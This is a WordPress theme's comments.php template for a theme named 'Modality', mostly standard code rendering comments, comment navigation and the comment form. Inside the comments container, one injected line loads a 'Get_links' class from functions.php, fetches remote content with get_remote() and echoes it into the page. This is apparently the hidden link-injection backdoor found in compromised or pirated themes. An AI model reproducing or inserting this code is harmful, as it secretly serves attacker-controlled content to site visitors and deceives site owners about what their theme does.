<?php
/**
 * The template for displaying Comments.
 *
 * The area of the page that contains both current comments
 * and the comment form.
 *
 * @package Modality
 *
 *
 * If the current post is protected by a password and the visitor has not yet
 * entered the password we will return early without loading the comments.
 */
if ( post_password_required() ) {
	return;
}
?>

<div id="comments" class="comments-area">
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
	<?php if ( have_comments() ) : ?>

		<h2 class="comments-title">
			<?php
				printf( _n( 'One thought on &ldquo;%2$s&rdquo;', '%1$s thoughts on &ldquo;%2$s&rdquo;', get_comments_number(), 'modality' ),
					number_format_i18n( get_comments_number() ), get_the_title() );
			?>
		</h2>

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : ?>
			<nav id="comment-nav-above" class="navigation comment-navigation" role="navigation">
				<h1 class="screen-reader-text"><?php _e( 'Comment navigation', 'modality' ); ?></h1>
				<div class="nav-previous"><?php previous_comments_link( __( '&larr; Older Comments', 'modality' ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( __( 'Newer Comments &rarr;', 'modality' ) ); ?></div>
			</nav><!-- #comment-nav-above -->
		<?php endif; // Check for comment navigation. ?>

		<ol class="comment-list">
			<?php
				wp_list_comments( array(
					'style'      => 'ol',
					'short_ping' => true,
					'avatar_size'=> 34,
				) );
			?>
		</ol><!-- .comment-list -->

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : ?>
			<nav id="comment-nav-below" class="navigation comment-navigation" role="navigation">
				<h1 class="screen-reader-text"><?php _e( 'Comment navigation', 'modality' ); ?></h1>
				<div class="nav-previous"><?php previous_comments_link( __( '&larr; Older Comments', 'modality' ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( __( 'Newer Comments &rarr;', 'modality' ) ); ?></div>
			</nav><!-- #comment-nav-below -->
		<?php endif; // Check for comment navigation. ?>

		<?php if ( ! comments_open() ) : ?>
			<p class="no-comments"><?php _e( 'Comments are closed.', 'modality' ); ?></p>
		<?php endif; ?>

	<?php endif; // have_comments() ?>

	<?php comment_form(); ?>

</div><!-- #comments -->
